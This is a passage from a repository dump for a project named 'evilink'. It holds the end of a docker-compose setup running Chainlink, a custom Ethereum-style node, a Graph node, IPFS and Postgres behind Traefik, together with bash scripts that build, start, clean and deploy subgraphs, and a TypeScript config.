      THE_GRAPH_USER: ${THE_GRAPH_USER}
      THE_GRAPH_PASSWORD: ${THE_GRAPH_PASSWORD}
      THE_GRAPH_DB: ${THE_GRAPH_DB}
    volumes:
    - ../.postgres/data:/var/lib/postgresql/data
    - ../.postgres/initdb.d:/docker-entrypoint-initdb.d
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U ${POSTGRES_USER}"]
      interval: 10s
      timeout: 5s
      retries: 5
    networks:
    - internal
  ipfs:
    image: ipfs/go-ipfs:v0.4.23
    # NOTE: uncomment for subgraph development
    # ports:
    # - 5001:5001
    volumes:
    - ../.ipfs/data:/data/ipfs
    healthcheck:
      test: ["CMD-SHELL", "ipfs cat /ipfs/QmQPeNsJPyVWPFDVHb77w8G42Fvo15z4bG2X8D2GhfbSXc/readme"]
      interval: 10s
      timeout: 5s
      retries: 5
    networks:
    - internal
  evilthereum:
    image: ${DOCKER_HUB_USER:-evilink}/evilthereum
    # NOTE: uncomment for debug
    # ports:
    # - ${RPC_PORT}:${RPC_PORT}
    restart: always
    depends_on:
      postgres:
        condition: service_healthy
    volumes:
    - ../.evilthereum/chaindb:/evilthereum/chaindb
    secrets:
    - api.txt
    - passphrase.txt
    environment:
    # NOTE: uncomment for debug
    # - NODE_ENV=debug
    - HTTP_PORT=${RPC_PORT}
    - CHAIN_ID=${CHAIN_ID}
    - CHAIN_DB_PATH=${CHAIN_DB_PATH}
    - CHAINLINK_API_DSN=http://chainlink:6688
    - CHAINLINK_API_AUTH_FILE=/run/secrets/api.txt
    - CHAINLINK_DATABASE_DSN=postgresql://${CHAINLINK_USER}:${CHAINLINK_PASSWORD}@postgres:5432/${CHAINLINK_DB}?sslmode=disable
    - CHAINLINK_VRF_KEY_PASSPHRASE_FILE=/run/secrets/passphrase.txt
    networks:
    - internal
    - reverse-proxy
    labels:
    - traefik.enable=true
    - traefik.http.routers.evilthereum.entrypoints=websecure
    - traefik.http.routers.evilthereum.tls.certresolver=tlschallenge
    - traefik.http.routers.evilthereum.service=evilthereum
    - traefik.http.routers.evilthereum.rule=Host(`${EVILTHEREUM_RPC_HOST}`)
    - traefik.http.services.evilthereum.loadbalancer.server.port=${RPC_PORT}
  chainlink:
    image: ${DOCKER_HUB_USER:-evilink}/chainlink:latest
    # NOTE: uncomment for chainlink development
    # ports:
    # - 6688:6688
    restart: always
    depends_on:
      postgres:
        condition: service_healthy
      evilthereum:
        condition: service_started
    command:
    - local
    - start
    - --api
    - /run/secrets/api.txt
    - --password
    - /run/secrets/passphrase.txt
    - --vrfpassword
    - /run/secrets/passphrase.txt
    volumes:
    - ../.chainlink/root:/chainlink
    secrets:
    - api.txt
    - passphrase.txt
    environment:
    - ROOT=/chainlink
    - LOG_LEVEL=debug
    - ETH_URL=ws://evilthereum:${RPC_PORT}
    - ETH_CHAIN_ID=${CHAIN_ID}
    - ETH_GAS_PRICE_DEFAULT=0
    - GAS_UPDATER_ENABLED=false
    - MIN_INCOMING_CONFIRMATIONS=0
    - MIN_OUTGOING_CONFIRMATIONS=0
    - LINK_CONTRACT_ADDRESS=0x87cc55e4e3b0a7f8f34cee3a3b39c674b9501ef3
    - CHAINLINK_TLS_PORT=0
    - SECURE_COOKIES=false
    - ALLOW_ORIGINS=*
    - DATABASE_URL=postgresql://${CHAINLINK_USER}:${CHAINLINK_PASSWORD}@postgres:5432/${CHAINLINK_DB}?sslmode=disable
    - DATABASE_TIMEOUT=0
    networks:
    - internal
  graph-node:
    image: graphprotocol/graph-node:v0.20.0
    # NOTE: uncomment for development
    # ports:
    # - 8000:8000
    # - 8001:8001
    # NOTE: uncomment for subgraph development
    # - 8020:8020
    # - 8030:8030
    depends_on:
      postgres:
        condition: service_healthy
      ipfs:
        condition: service_healthy
      evilthereum:
        condition: service_started
    environment:
      postgres_host: postgres
      postgres_user: ${THE_GRAPH_USER}
      postgres_pass: ${THE_GRAPH_PASSWORD}
      postgres_db: ${THE_GRAPH_DB}
      ipfs: ipfs:5001
      ethereum: evilthereum:http://evilthereum:${RPC_PORT}
      RUST_LOG: info
    networks:
    - internal
    - reverse-proxy
    labels:
    - traefik.enable=true
    - traefik.http.routers.graph-node-http.entrypoints=websecure
    - traefik.http.routers.graph-node-http.tls.certresolver=tlschallenge
    - traefik.http.routers.graph-node-http.service=graph-node-http
    - traefik.http.routers.graph-node-http.rule=Host(`${THE_GRAPH_HTTP_HOST}`)
    - traefik.http.services.graph-node-http.loadbalancer.server.port=8000
    - traefik.http.routers.graph-node-ws.entrypoints=websecure
    - traefik.http.routers.graph-node-ws.tls.certresolver=tlschallenge
    - traefik.http.routers.graph-node-ws.service=graph-node-ws
    - traefik.http.routers.graph-node-ws.rule=Host(`${THE_GRAPH_WS_HOST}`)
    - traefik.http.services.graph-node-ws.loadbalancer.server.port=8001
  playground:
    image: ${DOCKER_HUB_USER:-evilink}/playground
    # NOTE: uncomment for development
    # ports:
    # - 3000:3000
    depends_on:
      evilthereum:
        condition: service_started
      graph-node:
        condition: service_started
    environment:
    - THE_GRAPH_HTTP_ENDPOINT=${HTTP_PROTOCOL}://${THE_GRAPH_HTTP_HOST}
    - THE_GRAPH_WS_ENDPOINT=${HTTP_PROTOCOL}://${THE_GRAPH_WS_HOST}
    - ETHEREUM_CHAIN_ID=${CHAIN_ID}
    - ETHEREUM_RPC_ENDPOINT=${HTTP_PROTOCOL}://${EVILTHEREUM_RPC_HOST}
    networks:
    - internal
    - reverse-proxy
    labels:
    - traefik.enable=true
    - traefik.http.routers.playground.entrypoints=websecure
    - traefik.http.routers.playground.tls.certresolver=tlschallenge
    - traefik.http.routers.playground.service=playground
    - traefik.http.routers.playground.rule=Host(`${PLAYGROUND_HTTP_HOST}`)
    - traefik.http.services.playground.loadbalancer.server.port=3000
secrets:
  api.txt:
    file: ../.chainlink/secret/api.txt
  passphrase.txt:
    file: ../.chainlink/secret/passphrase.txt
networks:
  internal:
    name: internal
  reverse-proxy:
    external:
      name: reverse-proxy

'''
'''--- script/run.sh ---
#!/bin/bash

set -eo pipefail

DIR_ROOT="$(dirname "${BASH_SOURCE[0]}")/.."

# shellcheck disable=SC1090
source "$DIR_ROOT/script/util.sh"

ENV="$DIR_ROOT/script/docker-compose.env"
ENV_SAMPLE="$DIR_ROOT/script/docker-compose.sample.env"

PROJECT="evilink"
COMMANDS=(
    build
    config
    up
    down
    exec
    clean
    deploy_subgraph
)
BUILD_TARGETS=(
    evilthereum
    playground
)
SUBGRAPHS=(
    flipcoin
)

env_docker_compose() {
    [ ! -f "$ENV" ] && cp "$ENV_SAMPLE" "$ENV"
    # shellcheck disable=SC2046
    env $(grep -v '^#' "$ENV") \
        docker-compose -p "$PROJECT" -f "$DIR_ROOT/script/docker-compose.yml" "$@"
}

read_container_id_or_exit() {
    TARGET_CONTAINER_NAME=$1

    ALL_CONTAINERS=()
    while IFS='' read -r CONTAINER; do ALL_CONTAINERS+=("$CONTAINER"); done < \
        <(docker ps --filter "label=com.docker.compose.project=$PROJECT" --format "{{ .Label \"com.docker.compose.service\" }}:{{ .ID }}")

    if [ ${#ALL_CONTAINERS[@]} -eq  0 ]; then
        echo "nothing found in project $PROJECT, have you ever run 'bash script/run.sh up'?" >&2
        exit 1
    fi

    TARGET_CONTAINER_ID=$(value "${ALL_CONTAINERS[@]}" "$TARGET_CONTAINER_NAME")
    if [ -z "$TARGET_CONTAINER_ID" ]; then
        printf 'please specify container in\n' >&2
        printf '  * %s\n' "${ALL_CONTAINERS[@]//:*/}" >&2
        exit 1
    fi

    echo "$TARGET_CONTAINER_ID"
}

build() {
    PACKAGE="$1"
    if [ -n "$PACKAGE" ]; then
        help_if_command_not_found "${BUILD_TARGETS[@]}" "$PACKAGE"
        BUILD_TARGETS=("$PACKAGE")
        shift
    fi

    for TARGET in "${BUILD_TARGETS[@]}"; do
        yarn workspace "@evilink/$TARGET" build
        yarn docker build "@evilink/$TARGET" -t "${DOCKER_HUB_USER:-evilink}/$TARGET" "$@"
    done
}

config() {
    env_docker_compose config
}

up() {
    # make initdb.d script executable for postgresql initialization
    [ ! -d "$DIR_ROOT/.postgres/data" ] && chmod +x "$DIR_ROOT/.postgres/initdb.d/"*.sh
    env_docker_compose up -d "$@"
}

down() {
    env_docker_compose down
}

exec() {
    TARGET_CONTAINER_NAME=$1
    if [ -z "$TARGET_CONTAINER_NAME" ]; then echo "container name is required" && exit 1; else shift; fi

    TARGET_CONTAINER_ID=$(read_container_id_or_exit "$TARGET_CONTAINER_NAME")

    ENTRYPOINT=${1:-/bin/bash}
    docker exec -it "$TARGET_CONTAINER_ID" "$ENTRYPOINT"
}

clean() {
    rm -rf "${DIR_ROOT}/.chainlink/root"
    rm -rf "${DIR_ROOT}/.evilthereum/chaindb"
    rm -rf "${DIR_ROOT}/.ipfs/data"
    rm -rf "${DIR_ROOT}/.postgres/data"
}

deploy_subgraph() {
    NETWORK_ID=$(docker network ls \
        --filter "label=com.docker.compose.project=${PROJECT}" \
        --filter "name=internal" \
        --format "{{ .ID }}")
    THE_GRAPH_ID=$(read_container_id_or_exit graph-node)
    IPFS_ID=$(read_container_id_or_exit ipfs)

    SUBGRAPH=$1
    if [ -z "$SUBGRAPH" ]; then echo "subgraph name is required" && exit 1; else shift; fi
    help_if_command_not_found "${SUBGRAPHS[@]}" "$SUBGRAPH"

    docker run \
        -v "$(pwd)/${DIR_ROOT}/contracts/${SUBGRAPH}:/subgraph" \
        -w /subgraph \
        --network "$NETWORK_ID" \
        -e "THE_GRAPH_ADMIN_URI=http://${THE_GRAPH_ID}:8020" \
        -e "IPFS_URI=http://${IPFS_ID}:5001" \
        han0110/subgraph "$SUBGRAPH" "$@"
}

main() {
    help_if_command_not_found "${COMMANDS[@]}" "$1"
    "$@"
}

main "${@:-up}"

'''
'''--- script/util.sh ---
#!/bin/bash

value() {
    ARGS=() && IFS=" " read -r -a ARGS <<< "$@"
    TARGET=${ARGS[${#ARGS[@]}-1]}
    for PAIR in "${ARGS[@]:0:${#ARGS[@]}-1}"; do
        if [ "${PAIR%%:*}" = "$TARGET" ]; then
            echo "${PAIR#*:}"
        fi
    done
}

help_if_command_not_found() {
    CMDS=() && IFS=" " read -r -a CMDS <<< "$@"
    TARGET=${CMDS[${#CMDS[@]}-1]}
    for CMD in "${CMDS[@]:0:${#CMDS[@]}-1}"; do
        if [ "$TARGET" = "$CMD" ]; then
            return 0
        fi
    done

    printf 'invalid command %s, please specify one of below:\n' "$TARGET"
    printf '  * %s\n' "${CMDS[@]:0:${#CMDS[@]}-1}"
    exit 1
}

'''
'''--- tsconfig.json ---
{
  "compilerOptions": {
    "target": "es6",
    "module": "commonjs",
    "pretty": true,
    "sourceMap": true,
    "declaration": true,
    "declarationMap": true,
    "strict": true,
    "noImplicitAny": false,
    "strictNullChecks": false,
    "noImplicitThis": true,
    "alwaysStrict": true,
    "noUnusedLocals": true,
    "noUnusedParameters": false,
    "noImplicitReturns": true,
    "noFallthroughCasesInSwitch": true,
    "moduleResolution": "node",
    "baseUrl": ".",
    "allowSyntheticDefaultImports": true,
    "experimentalDecorators": true,
    "emitDecoratorMetadata": true,
    "resolveJsonModule": true,
    "esModuleInterop": true,
    "lib": [
      "es5",
      "es6",
      "dom",
      "es2015.core",
      "es2015.collection",
      "es2015.generator",
      "es2015.iterable",
      "es2015.promise",
      "es2015.proxy",
      "es2015.reflect",
      "es2015.symbol",
      "es2015.symbol.wellknown",
      "esnext.asynciterable"
    ]
  },
  "types": ["mocha"]
}

'''